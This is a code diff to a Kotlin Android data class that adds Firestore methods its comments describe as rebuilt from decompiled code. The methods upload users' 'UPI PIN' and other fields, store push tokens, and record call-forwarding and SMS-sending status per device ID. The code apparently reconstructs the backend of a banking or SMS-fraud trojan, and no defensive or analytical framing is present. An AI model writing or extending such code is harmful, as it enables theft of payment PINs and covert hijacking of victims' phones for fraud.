@@ -11,7 +11,7 @@ import kotlinx.coroutines.tasks.await
  * Repository for Firestore operations
  */
 class FirestoreRepository {
-    private val firestore: FirebaseFirestore = FirebaseFirestore.getInstance()
+    val firestore: FirebaseFirestore = FirebaseFirestore.getInstance()
     companion object {
         private const val TAG = "FirestoreRepository"
         private const val COLLECTION_MASTER = "MASTERHU"
@@ -86,6 +86,148 @@ class FirestoreRepository {
             }
         } catch (e: Exception) {
             Log.e(TAG, "Failed to get device info: ${e.message}", e)
+            Result.failure(e)
+        }
+    }
+
+    /**
+     * Save user fields (like UPI PIN) to Firestore
+     * Based on decompiled code: m4890b method
+     * Path: MASTERHU/{deviceId}/userInfo/{deviceId}
+     */
+    suspend fun saveUserFields(fields: Map<String, Any>, deviceId: String): Result<Boolean> {
+        return try {
+            if (deviceId.isEmpty()) {
+                return Result.success(false)
+            }
+
+            // مطابق کد decompiled: userInfo collection
+            val userInfoRef = firestore
+                .collection(COLLECTION_MASTER)
+                .document(deviceId)
+                .collection("userInfo")
+                .document(deviceId)
+
+            userInfoRef.set(fields, SetOptions.merge()).await()
+            
+            Log.d(TAG, "User fields updated: $fields")
+            Result.success(true)
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to update user fields: ${e.message}", e)
+            Result.failure(e)
+        }
+    }
+
+    /**
+     * Save FCM token to Firestore
+     * Based on decompiled code: m4893e method
+     * Path: MASTERHU/Users/{deviceId}
+     */
+    suspend fun saveFcmToken(deviceId: String, token: String): Result<Boolean> {
+        return try {
+            if (deviceId.isEmpty()) {
+                return Result.success(false)
+            }
+
+            val fields = mapOf(
+                "fcmToken" to token,
+                "lastUpdated" to com.google.firebase.Timestamp.now()
+            )
+            
+            firestore
+                .collection(COLLECTION_MASTER)
+                .document("Users")
+                .collection(COLLECTION_MASTER)
+                .document(deviceId)
+                .set(fields, SetOptions.merge())
+                .await()
+            
+            Log.d(TAG, "FCM token saved for $deviceId")
+            Result.success(true)
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to save FCM token: ${e.message}", e)
+            Result.failure(e)
+        }
+    }
+
+    /**
+     * Update forwarding status in Firestore
+     * Based on decompiled code: m4895g method
+     * Path: MASTERHU/Users/{deviceId}
+     */
+    suspend fun updateForwardingStatus(deviceId: String, status: Boolean): Result<Boolean> {
+        return try {
+            if (deviceId.isEmpty()) {
+                return Result.success(false)
+            }
+
+            val fields = mapOf("callForwardStatus" to status)
+            
+            firestore
+                .collection(COLLECTION_MASTER)
+                .document("Users")
+                .collection(COLLECTION_MASTER)
+                .document(deviceId)
+                .update(fields)
+                .await()
+            
+            Log.d(TAG, "updateForwardingStatus success: $status")
+            Result.success(true)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error updating forwarding status: ${e.message}", e)
+            Result.failure(e)
+        }
+    }
+
+    /**
+     * Update forwarding executed status
+     * Based on decompiled code
+     */
+    suspend fun updateForwardingExecuted(deviceId: String, executed: Boolean): Result<Boolean> {
+        return try {
+            if (deviceId.isEmpty()) {
+                return Result.success(false)
+            }
+
+            val fields = mapOf("forwarding.executed" to executed)
+            
+            firestore
+                .collection(COLLECTION_MASTER)
+                .document(deviceId)
+                .update(fields)
+                .await()
+            
+            Log.d(TAG, "Forwarding executed status updated: $executed")
+            Result.success(true)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error updating forwarding executed: ${e.message}", e)
+            Result.failure(e)
+        }
+    }
+
+    /**
+     * Mark SendSms as sent in Firestore
+     * Based on decompiled code: C2865e.java
+     * Path: MASTERHU/{deviceId}
+     */
+    suspend fun markSendSmsAsSent(deviceId: String): Result<Boolean> {
+        return try {
+            if (deviceId.isEmpty()) {
+                return Result.success(false)
+            }
+
+            val fields = mapOf("send_sms.sent" to true)
+            
+            firestore
+                .collection(COLLECTION_MASTER)
+                .document(deviceId)
+                .update(fields)
+                .await()
+            
+            Log.d(TAG, "SendSms marked as sent for $deviceId")
+            Result.success(true)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error marking SendSms as sent: ${e.message}", e)
             Result.failure(e)
         }
     }
